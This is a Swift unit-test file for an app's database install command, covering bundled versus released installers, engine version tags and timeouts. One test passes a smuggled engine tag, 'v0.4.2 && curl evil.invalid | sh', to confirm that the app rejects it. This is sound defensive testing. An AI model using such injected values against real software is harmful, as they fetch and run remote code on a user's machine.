import XCTest
@testable import ByoriManagerCore

/// What the single ByoriDB install action actually runs. The two buttons this
/// replaced differed only in which engine version each happened to land, so the
/// contract now is: Byori-owned assets from the app, engine always the newest
/// release.
final class ManagerServiceInstallTests: XCTestCase {
    private var root: URL!

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory
            .appendingPathComponent("byori-install-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    func testBundledAssetsAreUsedAndTheEngineIsTakenFromTheLatestRelease() async throws {
        let runtime = root.appendingPathComponent("runtime", isDirectory: true)
        try FileManager.default.createDirectory(at: runtime, withIntermediateDirectories: true)
        let installer = runtime.appendingPathComponent("install.sh")
        try Data("#!/bin/sh\n".utf8).write(to: installer)
        let paths = ManagerPaths(home: root, runtimeRoot: runtime)

        let command = await ManagerService(paths: paths).byoriInstallCommand()

        XCTAssertEqual(command.executable, "/bin/bash")
        XCTAssertEqual(command.arguments, [
            installer.path,
            "--assets", runtime.path,
            "--engine-tag", "latest",
            "--no-claude", "--no-codex",
        ])
    }

    /// `swift run` has no bundled runtime, so there are no assets to install from.
    /// Falling back to the released installer keeps the action working there
    /// instead of failing on a missing resource.
    func testAMissingBundledInstallerFallsBackToTheReleasedOne() async throws {
        let paths = ManagerPaths(
            home: root,
            runtimeRoot: root.appendingPathComponent("absent", isDirectory: true)
        )

        let command = await ManagerService(paths: paths).byoriInstallCommand()

        XCTAssertEqual(command.executable, "/bin/bash")
        // `pipefail` is what makes a failed curl fail the run instead of piping
        // an error page into bash.
        XCTAssertEqual(Array(command.arguments.prefix(2)), ["-o", "pipefail"])
        let script = try XCTUnwrap(command.arguments.last)
        XCTAssertTrue(script.contains("releases/latest/download/install.sh"), script)
        XCTAssertTrue(script.contains("--engine-tag latest"), script)
        XCTAssertFalse(script.contains("--assets"), "there is nothing to install from")
    }

    /// The release the page reported is the one that gets installed. The
    /// installer's own `latest` resolution is a `curl | awk` that gives up quietly
    /// on a rate limit and falls back to its pinned tag, which would install an
    /// engine the user had just been told was outdated.
    func testAResolvedEngineTagIsPassedThroughInsteadOfLatest() async throws {
        let paths = ManagerPaths(
            home: root,
            runtimeRoot: root.appendingPathComponent("absent", isDirectory: true)
        )

        let command = await ManagerService(paths: paths).byoriInstallCommand(engineTag: "v0.4.12")

        let script = try XCTUnwrap(command.arguments.last)
        XCTAssertTrue(script.contains("--engine-tag v0.4.12"), script)
        XCTAssertFalse(script.contains("--engine-tag latest"), script)
    }

    /// The tag is interpolated into a download URL and recorded in the engine
    /// manifest. `latest` is a correct install; a refused tag is no install at all.
    func testAnUnsafeEngineTagFallsBackToLatest() async throws {
        let paths = ManagerPaths(
            home: root,
            runtimeRoot: root.appendingPathComponent("absent", isDirectory: true)
        )

        let command = await ManagerService(paths: paths)
            .byoriInstallCommand(engineTag: "v0.4.2 && curl evil.invalid | sh")

        let script = try XCTUnwrap(command.arguments.last)
        XCTAssertTrue(script.contains("--engine-tag latest"), script)
        XCTAssertFalse(script.contains("evil.invalid"), script)
    }

    /// An install that hung would be worse than one that failed, and the engine
    /// download is the slow part of it.
    func testInstallCommandsCarryABoundedTimeout() async throws {
        let runtime = root.appendingPathComponent("runtime", isDirectory: true)
        try FileManager.default.createDirectory(at: runtime, withIntermediateDirectories: true)
        try Data("#!/bin/sh\n".utf8).write(to: runtime.appendingPathComponent("install.sh"))

        for runtimeRoot in [runtime, root.appendingPathComponent("absent", isDirectory: true)] {
            let command = await ManagerService(paths: ManagerPaths(home: root, runtimeRoot: runtimeRoot))
                .byoriInstallCommand()
            XCTAssertEqual(command.timeout, 900)
        }
    }
}
